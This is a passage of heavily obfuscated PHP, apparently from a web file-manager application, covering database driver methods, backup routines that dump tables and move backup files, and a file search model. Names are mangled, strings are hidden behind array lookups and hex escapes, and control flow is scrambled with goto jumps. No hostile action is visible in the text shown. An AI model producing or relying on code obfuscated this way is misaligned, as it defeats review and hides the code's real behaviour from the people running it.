$Eå‰’°¢Ÿé = $e„ãÃ¨ˆ[42] . $e„ãÃ¨ˆ[43] . $e„ãÃ¨ˆ[44]; break; case $e„ãÃ¨ˆ[867]: default: if (!empty($C×Ò­‚ğ¸É)) { $Eå‰’°¢Ÿé = $e„ãÃ¨ˆ[820] . $C×Ò­‚ğ¸É . $e„ãÃ¨ˆ[821]; } else { $Eå‰’°¢Ÿé = $e„ãÃ¨ˆ[822]; } } } $AéªöŠ²äù = $this->query($Eå‰’°¢Ÿé); $B“°™ùÑë¢ = array(); foreach ($AéªöŠ²äù as $fÕÒ Áï¸Ç => $AÍÄìÍØµ) { $B“°™ùÑë¢[$fÕÒ Áï¸Ç] = current($AÍÄìÍØµ); } return $B“°™ùÑë¢; } protected function parseLimit($A½Ñ¿‹èØÆ) { $cŒäÎãùŠê =& $_SERVER[í¤âËÚ£¶íÊ¢]; $E ¾®Çíˆ = $cŒäÎãùŠê[33]; if (!empty($A½Ñ¿‹èØÆ)) { switch ($this->dbType) { case $cŒäÎãùŠê[864]: case $cŒäÎãùŠê[856]: $A½Ñ¿‹èØÆ = explode($cŒäÎãùŠê[47], $A½Ñ¿‹èØÆ); if (count($A½Ñ¿‹èØÆ) > 1) { $E ¾®Çíˆ .= $cŒäÎãùŠê[48] . $A½Ñ¿‹èØÆ[1] . $cŒäÎãùŠê[49] . $A½Ñ¿‹èØÆ[0] . $cŒäÎãùŠê[50]; } else { $E ¾®Çíˆ .= $cŒäÎãùŠê[48] . $A½Ñ¿‹èØÆ[0] . $cŒäÎãùŠê[50]; } break; case $cŒäÎãùŠê[837]: case $cŒäÎãùŠê[855]: break; case $cŒäÎãùŠê[839]: break; case $cŒäÎãùŠê[838]: case $cŒäÎãùŠê[840]: break; case $cŒäÎãùŠê[867]: default: $E ¾®Çíˆ .= $cŒäÎãùŠê[48] . $A½Ñ¿‹èØÆ . $cŒäÎãùŠê[50]; } } return $E ¾®Çíˆ; } public function parseKey(&$dØŒ’†™°, $C©šºğñØ² = true) { $dªÃš§ğÆ» =& $_SERVER[í¤âËÚ£¶íÊ¢]; if ($C©šºğñØ²) { $dØŒ’†™° = $this->parseKeyCheck($dØŒ’†™°); } if ($this->dbType == $dªÃš§ğÆ»[867]) { if ($dØŒ’†™° != $dªÃš§ğÆ»[191] && !preg_match($dªÃš§ğÆ»[832], $dØŒ’†™°)) { $dØŒ’†™° = $dªÃš§ğÆ»[389] . trim($dØŒ’†™°, $dªÃš§ğÆ»[389]) . $dªÃš§ğÆ»[389]; } return $dØŒ’†™°; } else { return parent::parseKey($dØŒ’†™°, $C©šºğñØ²); } } public function close() { $this->_linkID = null; } public function error() { $B•‘‘÷ù¡ =& $_SERVER[í¤âËÚ£¶íÊ¢]; if ($this->PDOStatement) { $BÁ«ğ­‰¨¨ = $this->PDOStatement->errorInfo(); $this->error = $BÁ«ğ­‰¨¨[1] . $B•‘‘÷ù¡[4] . $BÁ«ğ­‰¨¨[2]; } else { $this->error = $B•‘‘÷ù¡[33]; } if ($B•‘‘÷ù¡[33] != $this->queryStr) { $this->error .= LNG($B•‘‘÷ù¡[45]) . $this->queryStr; } think_trace($this->error, $B•‘‘÷ù¡[33], $B•‘‘÷ù¡[46]); return $this->error; } public function escapeString($döî´ãù±Î) { $bŒæ‹˜ƒÏ =& $_SERVER[í¤âËÚ£¶íÊ¢]; switch ($this->dbType) { case $bŒæ‹˜ƒÏ[864]: case $bŒæ‹˜ƒÏ[837]: case $bŒæ‹˜ƒÏ[855]: case $bŒæ‹˜ƒÏ[867]: return addslashes($döî´ãù±Î); case $bŒæ‹˜ƒÏ[839]: case $bŒæ‹˜ƒÏ[856]: case $bŒæ‹˜ƒÏ[838]: case $bŒæ‹˜ƒÏ[840]: return str_ireplace($bŒæ‹˜ƒÏ[55], $bŒæ‹˜ƒÏ[56], $döî´ãù±Î); } } protected function parseValue($DÖ¹Œ¨–ğ‰) { $A“¦†Î¯÷ =& $_SERVER[í¤âËÚ£¶íÊ¢]; if (is_string($DÖ¹Œ¨–ğ‰)) { $Få˜““©Ò = strpos($DÖ¹Œ¨–ğ‰, $A“¦†Î¯÷[4]) === 0 && in_array($DÖ¹Œ¨–ğ‰, array_keys($this->bind)); $DÖ¹Œ¨–ğ‰ = $Få˜““©Ò ? $this->escapeString($DÖ¹Œ¨–ğ‰) : $A“¦†Î¯÷[877] . $this->escapeString($DÖ¹Œ¨–ğ‰) . $A“¦†Î¯÷[877]; } elseif (isset($DÖ¹Œ¨–ğ‰[0]) && is_string($DÖ¹Œ¨–ğ‰[0]) && strtolower($DÖ¹Œ¨–ğ‰[0]) == $A“¦†Î¯÷[302]) { $DÖ¹Œ¨–ğ‰ = $this->escapeString($DÖ¹Œ¨–ğ‰[1]); } elseif (is_array($DÖ¹Œ¨–ğ‰)) { $DÖ¹Œ¨–ğ‰ = array_map(array($this, $A“¦†Î¯÷[878]), $DÖ¹Œ¨–ğ‰); } elseif (is_bool($DÖ¹Œ¨–ğ‰)) { $DÖ¹Œ¨–ğ‰ = $DÖ¹Œ¨–ğ‰ ? $A“¦†Î¯÷[96] : $A“¦†Î¯÷[500]; } elseif (is_null($DÖ¹Œ¨–ğ‰)) { $DÖ¹Œ¨–ğ‰ = $A“¦†Î¯÷[112]; } return $DÖ¹Œ¨–ğ‰; } public function getLastInsertId() { $eŸØÃáŠâĞ =& $_SERVER[í¤âËÚ£¶íÊ¢]; switch ($this->dbType) { case $eŸØÃáŠâĞ[864]: case $eŸØÃáŠâĞ[856]: case $eŸØÃáŠâĞ[837]: case $eŸØÃáŠâĞ[855]: case $eŸØÃáŠâĞ[839]: case $eŸØÃáŠâĞ[867]: return $this->_linkID->lastInsertId(); case $eŸØÃáŠâĞ[838]: case $eŸØÃáŠâĞ[840]: $còĞ÷¡ê  = $this->table; $BµÁµ±­ìÛ = $this->query("\123\x45\x4c\105\x43\x54\x20{$còĞ÷¡ê }\x2e\x63\x75\x72\x72\x76\141\x6c\x20\143\165\162\162\166\x61\154\40\106\x52\x4f\x4d\x20\x64\x75\x61\154"); return $BµÁµ±­ìÛ ? $BµÁµ±­ìÛ[0][$eŸØÃáŠâĞ[879]] : 0; } } } goto dóğÑÅ©ß; Dãææ²Îôä: define($_SERVER[í¤âËÚ£¶íÊ¢][576], $_SERVER[í¤âËÚ£¶íÊ¢][577]); $b× ¤Šâöì = $_SERVER[í¤âËÚ£¶íÊ¢][578]; if (!$b× ¤Šâöì) { die; } goto b‹Ü‹ÀÑáã; dƒ†ãêºñ•: class Backup { protected static $name; protected static $option; public function __construct() { $this->init(); } public function init() { $c™ÜµùğºÈ =& $_SERVER[í¤âËÚ£¶íÊ¢]; self::$name = date($c™ÜµùğºÈ[692]); if (!($aµ§‹•Îîå = Model($c™ÜµùğºÈ[693])->lastItem())) { $aµ§‹•Îîå = $this->initData(); } else { self::$name = $aµ§‹•Îîå[$c™ÜµùğºÈ[28]]; if ($aµ§‹•Îîå[$c™ÜµùğºÈ[694]] == $c™ÜµùğºÈ[96]) { self::$name = date($c™ÜµùğºÈ[695]); $e†¸ ˆ³®æ = 0; if (isset($aµ§‹•Îîå[$c™ÜµùğºÈ[298]][$c™ÜµùğºÈ[201]][$c™ÜµùğºÈ[450]])) { $e†¸ ˆ³®æ = (int) $aµ§‹•Îîå[$c™ÜµùğºÈ[298]][$c™ÜµùğºÈ[201]][$c™ÜµùğºÈ[450]]; } if ($aµ§‹•Îîå[$c™ÜµùğºÈ[28]] == self::$name) { Model($c™ÜµùğºÈ[693])->remove($aµ§‹•Îîå[$c™ÜµùğºÈ[397]]); } $aµ§‹•Îîå = $this->initData($e†¸ ˆ³®æ, $aµ§‹•Îîå[$c™ÜµùğºÈ[696]]); } else { $this->checkStore($aµ§‹•Îîå[$c™ÜµùğºÈ[696]]); } } self::$option = $aµ§‹•Îîå; } private function initData($FÅ„à„‡ò = 0, $F§‡÷¬áù‘ = '') { goto DŒ‘Èº¤´; bèÙ½Éˆ®Ú: $this->checkStore($a‹ç®š±Š[$dğ¬ï»¤[696]]); $e““Ü‘å¡Ÿ = array($dğ¬ï»¤[696] => $a‹ç®š±Š[$dğ¬ï»¤[696]], $dğ¬ï»¤[28] => self::$name, $dğ¬ï»¤[694] => 0, $dğ¬ï»¤[697] => $a‹ç®š±Š[$dğ¬ï»¤[697]], $dğ¬ï»¤[298] => array($dğ¬ï»¤[698] => array($dğ¬ï»¤[694] => 0), $dğ¬ï»¤[699] => array($dğ¬ï»¤[694] => 0, $dğ¬ï»¤[700] => 0, $dğ¬ï»¤[701] => 0, $dğ¬ï»¤[29] => $dğ¬ï»¤[33]), $dğ¬ï»¤[702] => array($dğ¬ï»¤[694] => 0, $dğ¬ï»¤[700] => 0, $dğ¬ï»¤[701] => 0), $dğ¬ï»¤[201] => array($dğ¬ï»¤[694] => 0, $dğ¬ï»¤[703] => 0, $dğ¬ï»¤[704] => 0, $dğ¬ï»¤[705] => 0, $dğ¬ï»¤[706] => 0, $dğ¬ï»¤[450] => $FÅ„à„‡ò)), $dğ¬ï»¤[707] => time(), $dğ¬ï»¤[479] => 0); $F»‘Ğö³İ = Model($dğ¬ï»¤[693])->insert($e““Ü‘å¡Ÿ); goto B‰ÈãÌ•†§; B‰ÈãÌ•†§: $e““Ü‘å¡Ÿ[$dğ¬ï»¤[397]] = $F»‘Ğö³İ; return $e““Ü‘å¡Ÿ; goto EèİÕ¿ÒÓ©; DŒ‘Èº¤´: $dğ¬ï»¤ =& $_SERVER[í¤âËÚ£¶íÊ¢]; $a‹ç®š±Š = Model($dğ¬ï»¤[693])->config(); if ($F§‡÷¬áù‘ && $a‹ç®š±Š[$dğ¬ï»¤[696]] != $F§‡÷¬áù‘) { $FÅ„à„‡ò = 0; } goto bèÙ½Éˆ®Ú; EèİÕ¿ÒÓ©: } private function checkStore($f¹“ØëÀÖ) { $B‚”ÄÈ±„© =& $_SERVER[í¤âËÚ£¶íÊ¢]; $BéºœÚàŒá = Model($B‚”ÄÈ±„©[708])->listData($f¹“ØëÀÖ); Model($B‚”ÄÈ±„©[708])->checkConfig($BéºœÚàŒá); } public static function get() { if (!self::$option) { self::$option = Model($_SERVER[í¤âËÚ£¶íÊ¢][693])->findByName(self::$name); } return self::$option; } public static function set($aË¯å³í Æ) { $E«ÕôÍ¤ãå =& $_SERVER[í¤âËÚ£¶íÊ¢]; $cß‡ëÑÕÓ§ = self::get(); foreach ($aË¯å³í Æ as $AÕà¼Éî => $Aë–Â”ôÄ) { $CøÀòËù¤® = explode($E«ÕôÍ¤ãå[104], $AÕà¼Éî); $Fì–Ü­ÏÉ‚ = count($CøÀòËù¤®); switch ($Fì–Ü­ÏÉ‚) { case 1: $cß‡ëÑÕÓ§[$CøÀòËù¤®[0]] = $Aë–Â”ôÄ; break; case 2: $cß‡ëÑÕÓ§[$CøÀòËù¤®[0]][$CøÀòËù¤®[1]] = $Aë–Â”ôÄ; break; case 3: $cß‡ëÑÕÓ§[$CøÀòËù¤®[0]][$CøÀòËù¤®[1]][$CøÀòËù¤®[2]] = $Aë–Â”ôÄ; break; } } Model($E«ÕôÍ¤ãå[693])->update($cß‡ëÑÕÓ§[$E«ÕôÍ¤ãå[397]], $cß‡ëÑÕÓ§); self::$option = $cß‡ëÑÕÓ§; return self::$option; } public function keep() { $A¢Ñì”ÖÀÅ =& $_SERVER[í¤âËÚ£¶íÊ¢]; $fè‘Ò’Î® = self::get(); if ($fè‘Ò’Î®[$A¢Ñì”ÖÀÅ[298]][$A¢Ñì”ÖÀÅ[698]][$A¢Ñì”ÖÀÅ[694]] == $A¢Ñì”ÖÀÅ[96]) { return; } $this->backupKeep($fè‘Ò’Î®); self::set(array($A¢Ñì”ÖÀÅ[709] => 1)); } private function backupKeep($A¼ÛØòî°è) { goto Dñ²à†¹ßé; EŞ¤õ“‹»Ú: $cÏˆ¨Æ¯» = 0; $A¥øíµßªË = array(); foreach ($e—¼®ƒ‘Š® as $eÕ‡±Ü†ô©) { if ($cÏˆ¨Æ¯» >= 7) { break; } $A¥øíµßªË[] = $eÕ‡±Ü†ô©[$aº™ó†Ööó[28]]; $cÏˆ¨Æ¯»++; } goto b¢˜†ŞÅ‘; Dñ²à†¹ßé: $aº™ó†Ööó =& $_SERVER[í¤âËÚ£¶íÊ¢]; $e—¼®ƒ‘Š® = Model($aº™ó†Ööó[693])->listData(); if (empty($e—¼®ƒ‘Š®)) { return; } goto EŞ¤õ“‹»Ú; b¢˜†ŞÅ‘: for ($cÏˆ¨Æ¯» = 0; $cÏˆ¨Æ¯» < 12; $cÏˆ¨Æ¯»++) { $A¥øíµßªË[] = date($aº™ó†Ööó[710], strtotime("\x2d{$cÏˆ¨Æ¯»}\40\x6d\x6f\x6e\164\x68\163")); } $A¥øíµßªË = array_unique($A¥øíµßªË); foreach ($e—¼®ƒ‘Š® as $eÕ‡±Ü†ô©) { if (!empty($eÕ‡±Ü†ô©[$aº™ó†Ööó[28]]) && in_array($eÕ‡±Ü†ô©[$aº™ó†Ööó[28]], $A¥øíµßªË)) { continue; } Model($aº™ó†Ööó[693])->remove($eÕ‡±Ü†ô©[$aº™ó†Ööó[397]]); $BŠ×½È×´ = "\173\151\157\x3a{$A¼ÛØòî°è[$aº™ó†Ööó[696]]}\x7d\x2f\144\141\164\x61\x62\141\x73\x65\57\x62\x61\143\x6b\x75\x70\137{$eÕ‡±Ü†ô©[$aº™ó†Ööó[28]]}"; IO::remove($BŠ×½È×´, !1); } goto B‘ã¨Óˆ¨°; B‘ã¨Óˆ¨°: } public function db() { goto eêïŒšÇğ; D‰šîİåà·: return !0; goto EœÎ‚Ó æ¶; f¸á¿Š´ğ¨: $bÔ˜‰ñ·ˆ„ = new BackupDb(); if (!$bÔ˜‰ñ·ˆ„->index()) { return !1; } self::set(array($C…•ßÇ­ß†[711] => 1)); goto D‰šîİåà·; eêïŒšÇğ: $C…•ßÇ­ß† =& $_SERVER[í¤âËÚ£¶íÊ¢]; $a«Û¼Æ…¹² = self::get(); if ($a«Û¼Æ…¹²[$C…•ßÇ­ß†[298]][$C…•ßÇ­ß†[699]][$C…•ßÇ­ß†[694]] == $C…•ßÇ­ß†[96]) { return !0; } goto f¸á¿Š´ğ¨; EœÎ‚Ó æ¶: } public function dbFile() { goto E§›…øÎÒÖ; aŠ—ƒÊ‹ó: return !0; goto f´¾‡Õùİ; BºŸ¹Ãà: $bèå…‘ë¤ = new BackupDbFile(); if (!$bèå…‘ë¤->index()) { return !1; } self::set(array($bÏì‹ƒôé[712] => 1)); goto aŠ—ƒÊ‹ó; E§›…øÎÒÖ: $bÏì‹ƒôé =& $_SERVER[í¤âËÚ£¶íÊ¢]; $f¢Ğ°–ŞÌ° = self::get(); if ($f¢Ğ°–ŞÌ°[$bÏì‹ƒôé[298]][$bÏì‹ƒôé[702]][$bÏì‹ƒôé[694]] == $bÏì‹ƒôé[96]) { return !0; } goto BºŸ¹Ãà; f´¾‡Õùİ: } public function file() { $a»ºï£ÇĞ =& $_SERVER[í¤âËÚ£¶íÊ¢]; $Eèë”»¹Ğ = self::get(); if ($Eèë”»¹Ğ[$a»ºï£ÇĞ[298]][$a»ºï£ÇĞ[201]][$a»ºï£ÇĞ[694]] == $a»ºï£ÇĞ[96]) { return !0; } if (!isset($Eèë”»¹Ğ[$a»ºï£ÇĞ[697]]) || $Eèë”»¹Ğ[$a»ºï£ÇĞ[697]] == $a»ºï£ÇĞ[500]) { $AÁ¤ÑÜÕ‹• = new BackupFile(); if (!$AÁ¤ÑÜÕ‹•->index()) { return !1; } } self::set(array($a»ºï£ÇĞ[713] => 1, $a»ºï£ÇĞ[694] => 1)); return !0; } } class BackupDb { protected static $io; protected static $name; public function __construct() { } public function index() { goto A—õÕò¶Øè; B™±ØÃŞ ¹: $e‚‹è¥Îöã = new DbManage($e…„°†–¸è, $F¡ªğÉ´õè); $FÃ‰¤–Òë® = TEMP_FILES . $FïçÕ’õ£Î[714] . self::$name . $FïçÕ’õ£Î[8]; del_dir($FÃ‰¤–Òë®); goto cáìâ¢‘ƒ; Dß»‚”–èª: $cŸÎ¾“§Ú = array($FïçÕ’õ£Î[726] => $F¡ªğÉ´õè, $FïçÕ’õ£Î[711] => 1, $FïçÕ’õ£Î[727] => $d›¡Û–ÜĞö, $FïçÕ’õ£Î[728] => $C‘Ÿí£ƒÙ); Backup::set($cŸÎ¾“§Ú); if ($d›¡Û–ÜĞö > $C‘Ÿí£ƒÙ) { return !1; } goto b¨äëå¡Õ; CÅ÷¸õ“ë„: self::$name = $BÇÚÕ²ê¼[$FïçÕ’õ£Î[28]]; $e…„°†–¸è = $GLOBALS[$FïçÕ’õ£Î[6]][$FïçÕ’õ£Î[17]]; $F¡ªğÉ´õè = $this->_dbType($e…„°†–¸è); goto B™±ØÃŞ ¹; b¨äëå¡Õ: return !0; goto a‰Ğ‚Æ¹‹£; A—õÕò¶Øè: $FïçÕ’õ£Î =& $_SERVER[í¤âËÚ£¶íÊ¢]; $BÇÚÕ²ê¼ = Backup::get(); self::$io = $BÇÚÕ²ê¼[$FïçÕ’õ£Î[696]]; goto CÅ÷¸õ“ë„; DÒÏåÅ²‹›: foreach ($aÛòÇÒøÍº as $a…‚Äš£¯) { $CÀïÜ†“…‡ = $FÃ‰¤–Òë® . $a…‚Äš£¯ . $FïçÕ’õ£Î[722]; $aéÜÃ°”À = null; if ($a…‚Äš£¯ == $FïçÕ’õ£Î[723] && (!isset($BÇÚÕ²ê¼[$FïçÕ’õ£Î[697]]) || $BÇÚÕ²ê¼[$FïçÕ’õ£Î[697]] == $FïçÕ’õ£Î[500])) { $aéÜÃ°”À = self::$io; } $C‘Ÿí£ƒÙ += $e‚‹è¥Îöã->sqlFromDb($a…‚Äš£¯, $CÀïÜ†“…‡, $E¥ÜÔª¢, $aéÜÃ°”À); } if (isset($E¥ÜÔª¢->task[$FïçÕ’õ£Î[724]])) { $c´˜ÒÖÏ·Õ = $E¥ÜÔª¢->task[$FïçÕ’õ£Î[724]] ? $E¥ÜÔª¢->task[$FïçÕ’õ£Î[724]] : timeFloat(); $F©²Ùä—ƒÜ = $c´˜ÒÖÏ·Õ - $E¥ÜÔª¢->task[$FïçÕ’õ£Î[725]]; if ($F©²Ùä—ƒÜ >= 0.2) { $d›¡Û–ÜĞö += 1; } } $E¥ÜÔª¢->end(); goto Dß»‚”–èª; cáìâ¢‘ƒ: mk_dir($FÃ‰¤–Òë®); $d›¡Û–ÜĞö = $C‘Ÿí£ƒÙ = 0; try { $aÛòÇÒøÍº = $e‚‹è¥Îöã->db()->getTables(); } catch (Exception $fÈ‘¿ùŠÃ…) { return !1; } goto DçªŒ¬Á¡Ä; DçªŒ¬Á¡Ä: $aÛòÇÒøÍº = array_diff($aÛòÇÒøÍº, array($FïçÕ’õ£Î[715], $FïçÕ’õ£Î[716])); foreach ($aÛòÇÒøÍº as $a…‚Äš£¯) { $d›¡Û–ÜĞö += $e‚‹è¥Îöã->model($a…‚Äš£¯)->count(); } $E¥ÜÔª¢ = new Task($FïçÕ’õ£Î[717], $FïçÕ’õ£Î[718], $d›¡Û–ÜĞö, LNG($FïçÕ’õ£Î[719]) . $FïçÕ’õ£Î[720] . LNG($FïçÕ’õ£Î[721])); goto DÒÏåÅ²‹›; a‰Ğ‚Æ¹‹£: } private function _dbType($a÷Öã¡æ) { goto Aµ»ªÔÃæù; Aµ»ªÔÃæù: $e¦¬ßäÅë =& $_SERVER[í¤âËÚ£¶íÊ¢]; $a÷Öã¡æ = array_change_key_case($a÷Öã¡æ); $CôÉ¬™ºŒ‰ = $a÷Öã¡æ[$e¦¬ßäÅë[729]]; goto Fõ¿É³¬‚; Fì¶õîÛÛï: return $CôÉ¬™ºŒ‰; goto dÚğ÷èÓ³ƒ; Fõ¿É³¬‚: if ($CôÉ¬™ºŒ‰ == $e¦¬ßäÅë[730]) { $BëÖïÜŒì = explode($e¦¬ßäÅë[4], $a÷Öã¡æ[$e¦¬ßäÅë[731]]); $CôÉ¬™ºŒ‰ = $BëÖïÜŒì[0]; } $CäœõĞÍŒ† = array($e¦¬ßäÅë[732] => $e¦¬ßäÅë[9], $e¦¬ßäÅë[733] => $e¦¬ßäÅë[734]); if (isset($CäœõĞÍŒ†[$CôÉ¬™ºŒ‰])) { $CôÉ¬™ºŒ‰ = $CäœõĞÍŒ†[$CôÉ¬™ºŒ‰]; } goto Fì¶õîÛÛï; dÚğ÷èÓ³ƒ: } } class BackupDbFile { public function __construct() { } public function index() { goto fÏë»×Ô…Ö; DĞéÉ×¹÷Ï: $A×Ó¿Æ¯ÓÊ->task[$a¿¾¨Ñ¹‡ñ[703]] = $AÛ°æÒÄ; foreach ($fá†øÌ¸ «[$a¿¾¨Ñ¹‡ñ[83]] as $C•Ù°±¤‹¡) { $aìÒò„¾›Ê = IO::move($C•Ù°±¤‹¡[$a¿¾¨Ñ¹‡ñ[85]], $BîçÉšÕŠæ); if (!$aìÒò„¾›Ê) { $A×Ó¿Æ¯ÓÊ->end(); $aöíæ¡¢ôÚ = IO::getLastError($a¿¾¨Ñ¹‡ñ[738] . $C•Ù°±¤‹¡[$a¿¾¨Ñ¹‡ñ[85]] . $a¿¾¨Ñ¹‡ñ[739] . $BîçÉšÕŠæ . $a¿¾¨Ñ¹‡ñ[508]); write_log($aöíæ¡¢ôÚ, $a¿¾¨Ñ¹‡ñ[718]); return !1; } } $B®Ÿ¹¬‚“Š = CONTROLLER_DIR . $a¿¾¨Ñ¹‡ñ[740]; goto EŒÛÅÍÂ×µ; fÏë»×Ô…Ö: $a¿¾¨Ñ¹‡ñ =& $_SERVER[í¤âËÚ£¶íÊ¢]; $C£“†à¤„Ò = Backup::get(); $B«Æ˜•Ù¬ƒ = $C£“†à¤„Ò[$a¿¾¨Ñ¹‡ñ[28]]; goto FŠ‰•²¦¡™; EŒÛÅÍÂ×µ: $F¦‘ÁÆìè = CONTROLLER_DIR . $a¿¾¨Ñ¹‡ñ[741]; IO::copy($B®Ÿ¹¬‚“Š, $BîçÉšÕŠæ); IO::copy($F¦‘ÁÆìè, $BîçÉšÕŠæ); goto aê¼ĞÖÊ”¥; e¯»®áÑï¤: if (!$AÛ°æÒÄ) { return !1; } Backup::set(array($a¿¾¨Ñ¹‡ñ[735] => $AÛ°æÒÄ)); $A×Ó¿Æ¯ÓÊ = new TaskFileTransfer($a¿¾¨Ñ¹‡ñ[736], $a¿¾¨Ñ¹‡ñ[718], count($cÆÛÇè§¨), LNG($a¿¾¨Ñ¹‡ñ[719]) . $a¿¾¨Ñ¹‡ñ[443] . LNG($a¿¾¨Ñ¹‡ñ[721]) . $a¿¾¨Ñ¹‡ñ[737]); goto DĞéÉ×¹÷Ï; aê¼ĞÖÊ”¥: $A×Ó¿Æ¯ÓÊ->end(); Backup::set(array($a¿¾¨Ñ¹‡ñ[742] => $AÛ°æÒÄ)); return !0; goto b İ¸ë Š; F¢ôË×Œ: $fá†øÌ¸ « = IO::listPath($CÎÇÔÚŸ®ğ); $cÆÛÇè§¨ = isset($fá†øÌ¸ «[$a¿¾¨Ñ¹‡ñ[83]]) ? $fá†øÌ¸ «[$a¿¾¨Ñ¹‡ñ[83]] : array(); $AÛ°æÒÄ = array_sum(array_column($cÆÛÇè§¨, $a¿¾¨Ñ¹‡ñ[87])); goto e¯»®áÑï¤; FŠ‰•²¦¡™: $CÎÇÔÚŸ®ğ = TEMP_FILES . "\x62\x61\x63\153\165\160\137{$B«Æ˜•Ù¬ƒ}\x2f"; $BîçÉšÕŠæ = "\173\151\x6f\x3a{$C£“†à¤„Ò[$a¿¾¨Ñ¹‡ñ[696]]}\175\x2f\144\141\164\x61\142\141\163\x65\x2f\x62\141\143\153\x75\x70\137{$B«Æ˜•Ù¬ƒ}\x2f"; if (!($BîçÉšÕŠæ = IO::mkdir($BîçÉšÕŠæ))) { return !1; } goto F¢ôË×Œ; b İ¸ë Š: } } goto DÎ­‘÷éÁ; c©íÁ¥ö“: class SourceListSearchModel extends SourceListMoveModel { public static function fileTypeWhere($CÁˆ¼®µ¼) { goto f˜“¦Íø¸ô; A‡îÇâğâÚ: if (!$B©Ï‚ß ¸[$AïÛ‡½Ê´È[177]]) { $Aã»Áİ¸¾Ş = array_to_keyvalue($b†£ó°ÁóÍ, $AïÛ‡½Ê´È[33], $AïÛ‡½Ê´È[177]); $dÅ‘ò§êÜä = implode($AïÛ‡½Ê´È[47], $Aã»Áİ¸¾Ş); $eöŞøÏÊ¤ = $AïÛ‡½Ê´È[1891]; } $c·‘Ú²íŠõ = explode($AïÛ‡½Ê´È[47], trim($dÅ‘ò§êÜä, $AïÛ‡½Ê´È[47])); return array($eöŞøÏÊ¤, $c·‘Ú²íŠõ); goto c¥¨á–âË; f˜“¦Íø¸ô: $AïÛ‡½Ê´È =& $_SERVER[í¤âËÚ£¶íÊ¢]; $b†£ó°ÁóÍ = KodIO::fileTypeList(); $B©Ï‚ß ¸ = $b†£ó°ÁóÍ[$CÁˆ¼®µ¼]; goto AĞ‘§¦ŠÚÁ; AĞ‘§¦ŠÚÁ: if (!$B©Ï‚ß ¸) { return array(); } $dÅ‘ò§êÜä = $B©Ï‚ß ¸[$AïÛ‡½Ê´È[177]]; $eöŞøÏÊ¤ = $AïÛ‡½Ê´È[7]; goto A‡îÇâğâÚ; c¥¨á–âË: } public function listPathType($A„ğ•×Å„­) { $dŒ¾Œİ¹å£ =& $_SERVER[í¤âËÚ£¶íÊ¢]; $däâŒ»ñ„ = $this->fileTypeWhere($A„ğ•×Å„­); if (!$däâŒ»ñ„) { return array(); } $FŠİÀ¤®Û¦ = array($dŒ¾Œİ¹å£[553] => SourceModel::TYPE_USER, $dŒ¾Œİ¹å£[554] => USER_ID, $dŒ¾Œİ¹å£[550] => 0, $dŒ¾Œİ¹å£[551] => $däâŒ»ñ„); return $this->listSource($FŠİÀ¤®Û¦); } public function listSearch($DŸ¥†§Ë·‹, $f¬Ëî…ˆôª = 300) { goto Bˆ¬Á ê…; Bˆ¬Á ê…: $dÆÑ‘ê¬ƒÕ =& $_SERVER[í¤âËÚ£¶íÊ¢]; if (isset($DŸ¥†§Ë·‹[$dÆÑ‘ê¬ƒÕ[1734]]) && $DŸ¥†§Ë·‹[$dÆÑ‘ê¬ƒÕ[1734]]) { $DŸ¥†§Ë·‹[$dÆÑ‘ê¬ƒÕ[1734]] = str_replace($dÆÑ‘ê¬ƒÕ[388], $dÆÑ‘ê¬ƒÕ[1892], trim($DŸ¥†§Ë·‹[$dÆÑ‘ê¬ƒÕ[1734]])); } $EíùšâˆÎÚ = $this->_parseSearchWhere($DŸ¥†§Ë·‹); goto D¼ª…ïÀê; A©¦ê½ö£Ë: $D ä‡´‰ = $this->distinct(!0)->field($Dê›„µãÌ–)->where($EíùšâˆÎÚ)->selectPage($f¬Ëî…ˆôª); $this->_listSearchFileContent($D ä‡´‰, $DŸ¥†§Ë·‹, $eŞ¤Ç¼‡äØ); $this->_listSearchDesc($D ä‡´‰, $DŸ¥†§Ë·‹, $eŞ¤Ç¼‡äØ); goto eØ¶¥ˆĞÆ¤; Bªã–áÖ…: $this->_listMake($D ä‡´‰); return $D ä‡´‰; goto b¡ñµš¸«Î; b¬å¥ìÄ§: $this->_listSearchBindPinyin($DŸ¥†§Ë·‹, $EíùšâˆÎÚ, $Dê›„µãÌ–); $this->alias($dÆÑ‘ê¬ƒÕ[520])->_makeOrder(); $EíùšâˆÎÚ = $this->parseWhereLike($EíùšâˆÎÚ); goto A©¦ê½ö£Ë; D¼ª…ïÀê: if (!isset($EíùšâˆÎÚ[$dÆÑ‘ê¬ƒÕ[426]])) { $EíùšâˆÎÚ[$dÆÑ‘ê¬ƒÕ[426]] = 0; } $Dê›„µãÌ– = $dÆÑ‘ê¬ƒÕ[1893]; $eŞ¤Ç¼‡äØ = $Dê›„µãÌ–; goto b¬å¥ìÄ§; eØ¶¥ˆĞÆ¤: $this->_listSearchTag($D ä‡´‰, $DŸ¥†§Ë·‹, $eŞ¤Ç¼‡äØ); $this->_listSearchGroupTag($D ä‡´‰, $DŸ¥†§Ë·‹, $eŞ¤Ç¼‡äØ); $this->_listDataApply($D ä‡´‰[$dÆÑ‘ê¬ƒÕ[375]]); goto Bªã–áÖ…; b¡ñµš¸«Î: } private function _listSearchFileContent(&$eÄµŒğ†„, $a¾•˜¦‰ÅÇ, $AáĞíóÊ®Ù) { goto C‹í°ñ§³; dœÄ´õ”Ä¥: if (!isset($F¸àŒ¤Çºé[$eÕˆ‡‚ó»[28]]) || !is_array($a¾•˜¦‰ÅÇ[$eÕˆ‡‚ó»[450]])) { return; } $F¸àŒ¤Çºé[$eÕˆ‡‚ó»[450]] = array($eÕˆ‡‚ó»[7], $a¾•˜¦‰ÅÇ[$eÕˆ‡‚ó»[450]]); unset($F¸àŒ¤Çºé[$eÕˆ‡‚ó»[28]]); goto D·µ÷Ñïº; a»÷´ÏñŒ»: $eÄµŒğ†„[$eÕˆ‡‚ó»[375]] = array_merge($aŠ‚¡†ß›‡, $eÄµŒğ†„[$eÕˆ‡‚ó»[375]]); $eÄµŒğ†„[$eÕˆ‡‚ó»[372]][$eÕˆ‡‚ó»[373]] += count($aŠ‚¡†ß›‡); goto f÷©Šâ‚”; C‹í°ñ§³: $eÕˆ‡‚ó» =& $_SERVER[í¤âËÚ£¶íÊ¢]; if (!$a¾•˜¦‰ÅÇ[$eÕˆ‡‚ó»[1734]] || $eÄµŒğ†„[$eÕˆ‡‚ó»[372]][$eÕˆ‡‚ó»[358]] > 1) { return; } $F¸àŒ¤Çºé = $this->_parseSearchWhere($a¾•˜¦‰ÅÇ); goto dœÄ´õ”Ä¥; D·µ÷Ñïº: unset($a¾•˜¦‰ÅÇ[$eÕˆ‡‚ó»[450]]); $aŠ‚¡†ß›‡ = 